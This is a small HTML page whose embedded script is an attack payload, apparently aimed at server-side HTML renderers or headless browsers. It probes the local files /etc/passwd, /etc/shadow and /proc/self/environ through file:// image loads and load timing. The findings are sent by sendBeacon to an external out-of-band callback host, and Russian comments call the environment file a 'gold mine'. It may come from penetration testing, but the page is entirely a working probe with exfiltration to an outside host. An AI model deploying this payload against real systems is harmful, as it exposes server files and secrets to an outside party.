<!DOCTYPE html>
<html>
<body>
<script>
    const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";

    function checkFile(path) {
        const img = new Image();
        const start = Date.now();
        
        img.onload = () => navigator.sendBeacon(hook + "/EXISTS_" + btoa(path));
        img.onerror = () => {
            const duration = Date.now() - start;
            // Если ошибка пришла мгновенно - файл есть, но это не картинка.
            // Если долго - возможно, таймаут.
            navigator.sendBeacon(hook + "/PROBE_FILE", JSON.stringify({path: path, time: duration}));
        };
        img.src = "file://" + path;
    }

    // Проверяем классику Linux серверов
    checkFile("/etc/passwd");
    checkFile("/etc/shadow"); // Тут точно будет ошибка доступа, но это пруф
    checkFile("/proc/self/environ"); // Золотая жила переменных окружения
</script>
</body>
</html>
